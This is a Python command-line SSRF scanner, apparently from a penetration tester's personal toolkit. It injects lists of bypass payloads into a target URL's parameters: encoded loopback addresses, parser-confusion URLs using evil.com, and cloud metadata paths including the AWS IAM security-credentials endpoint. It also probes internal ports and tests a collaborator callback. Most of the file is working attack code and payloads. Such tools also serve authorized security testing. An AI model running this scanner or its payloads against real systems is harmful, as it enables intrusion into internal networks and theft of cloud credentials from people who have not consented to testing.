#!/usr/bin/env python3
"""
SSRF Scanner
Server-Side Request Forgery vulnerability scanner.

USAGE:
    python ssrf_scanner.py <url> [-p param] [--collaborator domain] [--internal-scan]

EXAMPLES:
    python ssrf_scanner.py "https://example.com/fetch?url=http://test.com"
    python ssrf_scanner.py "https://example.com/proxy?url=test" -p url --internal-scan
    python ssrf_scanner.py "https://example.com/fetch?url=test" --collaborator your.burpcollaborator.net
"""

import sys
import argparse
import re
import socket
from urllib.parse import urlparse, parse_qs, urlencode, quote
sys.path.insert(0, '/home/l0ve/Desktop/WD/Tools')
from lib import success, error, warning, info, banner, HTTPClient

# Internal network targets
INTERNAL_TARGETS = [
    'http://127.0.0.1',
    'http://localhost',
    'http://[::1]',
    'http://0.0.0.0',
    'http://127.1',
    'http://127.0.1',
    'http://2130706433',  # 127.0.0.1 in decimal
    'http://0x7f000001',  # 127.0.0.1 in hex
    'http://017700000001',  # 127.0.0.1 in octal
    'http://169.254.169.254',  # AWS metadata
    'http://metadata.google.internal',  # GCP metadata
    'http://169.254.169.254/latest/meta-data/',  # AWS
    'http://100.100.100.200/latest/meta-data/',  # Alibaba
    'http://192.168.1.1',
    'http://192.168.0.1',
    'http://10.0.0.1',
    'http://172.16.0.1',
]

# Common ports to scan
COMMON_PORTS = [21, 22, 23, 25, 80, 110, 443, 445, 3306, 5432, 6379, 8080, 8443, 27017]

# SSRF bypass payloads
BYPASS_PAYLOADS = [
    # URL encoding
    'http://127.0.0.1',
    'http://127.0.0.1:80',
    'http://127.0.0.1:443',
    'http://127.0.0.1:22',

    # Different representations
    'http://2130706433',
    'http://0x7f.0x0.0x0.0x1',
    'http://0177.0.0.01',
    'http://127.1',
    'http://127.0.1',

    # IPv6
    'http://[::1]',
    'http://[0000::1]',
    'http://[::ffff:127.0.0.1]',

    # URL tricks
    'http://127.0.0.1#@evil.com',
    'http://evil.com#@127.0.0.1',
    'http://127.0.0.1?@evil.com',
    'http://evil.com@127.0.0.1',
    'http://127.0.0.1\\@evil.com',

    # Protocol smuggling
    'http://127.0.0.1:80\\@evil.com',
    'http://127.0.0.1%2523@evil.com',
    'http://127.0.0.1%00@evil.com',

    # DNS rebinding
    'http://spoofed.burpcollaborator.net',

    # Cloud metadata
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://169.254.169.254/metadata/v1/',
]

# Patterns indicating successful SSRF
SSRF_INDICATORS = {
    'localhost_response': [r'localhost', r'127\.0\.0\.1', r'::1'],
    'aws_metadata': [r'ami-id', r'instance-id', r'instance-type', r'security-credentials'],
    'gcp_metadata': [r'computeMetadata', r'project-id', r'zone'],
    'internal_page': [r'<title>.*dashboard.*</title>', r'admin', r'internal'],
    'port_scan_open': [r'connected', r'open', r'SSH', r'FTP', r'HTTP'],
    'error_disclosure': [r'connection refused', r'no route to host', r'timeout', r'failed to connect'],
}


class SSRFScanner:
    def __init__(self, proxy: str = None, timeout: int = 10):
        self.client = HTTPClient(proxy=proxy, timeout=timeout)
        self.vulnerabilities = []
        self.baseline = None

    def get_baseline(self, url: str, param: str) -> dict:
        """Get baseline response."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = ['http://nonexistent-domain-xyz123.com']
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            resp = self.client.get(test_url)
            self.baseline = {
                'status': resp.status_code,
                'length': len(resp.text),
                'content': resp.text
            }
            return self.baseline
        except:
            return None

    def detect_ssrf(self, content: str) -> list:
        """Detect SSRF indicators in response."""
        detected = []
        for indicator, patterns in SSRF_INDICATORS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    detected.append(indicator)
                    break
        return detected

    def test_payload(self, url: str, param: str, payload: str) -> dict:
        """Test a single SSRF payload."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"

            resp = self.client.get(test_url, timeout=15)

            indicators = self.detect_ssrf(resp.text)

            # Check for significant changes
            len_diff = abs(len(resp.text) - self.baseline['length']) if self.baseline else 0
            status_diff = resp.status_code != self.baseline['status'] if self.baseline else False

            if indicators or len_diff > 200 or status_diff:
                return {
                    'vulnerable': True,
                    'payload': payload,
                    'indicators': indicators,
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'content_preview': resp.text[:500]
                }

        except Exception as e:
            # Timeout or connection error might indicate successful internal request
            if 'timeout' in str(e).lower():
                return {
                    'vulnerable': True,
                    'payload': payload,
                    'indicators': ['timeout_possible_internal'],
                    'status': 0,
                    'length': 0
                }

        return {'vulnerable': False}

    def scan_internal_ports(self, url: str, param: str, host: str = '127.0.0.1') -> list:
        """Scan internal ports via SSRF."""
        findings = []

        for port in COMMON_PORTS:
            payload = f"http://{host}:{port}"
            result = self.test_payload(url, param, payload)

            if result['vulnerable']:
                findings.append({
                    'type': 'port_scan',
                    'host': host,
                    'port': port,
                    'payload': payload,
                    'indicators': result.get('indicators', [])
                })
                info(f"  Port {port}: Possible response")

        return findings

    def scan(self, url: str, params: list = None, scan_internal: bool = False,
             collaborator: str = None) -> list:
        """Run SSRF scan."""

        # Auto-detect parameters
        if not params:
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())

        if not params:
            warning("No parameters to test")
            return []

        for param in params:
            info(f"\nTesting parameter: {param}")

            # Get baseline
            self.get_baseline(url, param)

            # Test bypass payloads
            info("Testing bypass payloads...")
            for payload in BYPASS_PAYLOADS:
                result = self.test_payload(url, param, payload)
                if result['vulnerable']:
                    self.vulnerabilities.append({
                        'type': 'ssrf_bypass',
                        'param': param,
                        'payload': payload,
                        'indicators': result['indicators'],
                        'status': result['status']
                    })
                    success(f"[SSRF] param={param} | payload={payload} | indicators={result['indicators']}")

            # Test internal targets
            info("Testing internal targets...")
            for target in INTERNAL_TARGETS:
                result = self.test_payload(url, param, target)
                if result['vulnerable']:
                    self.vulnerabilities.append({
                        'type': 'ssrf_internal',
                        'param': param,
                        'payload': target,
                        'indicators': result['indicators'],
                        'status': result['status']
                    })
                    success(f"[SSRF] param={param} | payload={target} | indicators={result['indicators']}")

            # Scan internal ports
            if scan_internal:
                info("Scanning internal ports...")
                port_results = self.scan_internal_ports(url, param)
                self.vulnerabilities.extend(port_results)

            # Collaborator/callback test
            if collaborator:
                callback_payload = f"http://{collaborator}"
                info(f"Testing with collaborator: {callback_payload}")
                self.test_payload(url, param, callback_payload)
                warning(f"Check collaborator for callbacks from param={param}")

        return self.vulnerabilities


def main():
    parser = argparse.ArgumentParser(
        description='SSRF Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
    %(prog)s "https://example.com/fetch?url=http://test.com"
    %(prog)s "https://example.com/proxy?url=test" -p url --internal-scan
    %(prog)s "https://example.com/fetch?url=test" --collaborator your.burpcollaborator.net
        """
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-p', '--param', action='append', help='Parameter to test')
    parser.add_argument('--internal-scan', action='store_true', help='Scan internal ports')
    parser.add_argument('--collaborator', help='Burp Collaborator or callback domain')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('-o', '--output', help='Output file')
    args = parser.parse_args()

    banner("SSRF Scanner")
    info(f"Target: {args.url}")

    scanner = SSRFScanner(proxy=args.proxy)
    results = scanner.scan(
        args.url,
        params=args.param,
        scan_internal=args.internal_scan,
        collaborator=args.collaborator
    )

    print()
    if results:
        success(f"Found {len(results)} potential SSRF issue(s)")
    else:
        warning("No SSRF vulnerabilities detected")

    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump({'url': args.url, 'vulnerabilities': results}, f, indent=2)
        success(f"Results saved to {args.output}")


if __name__ == '__main__':
    main()
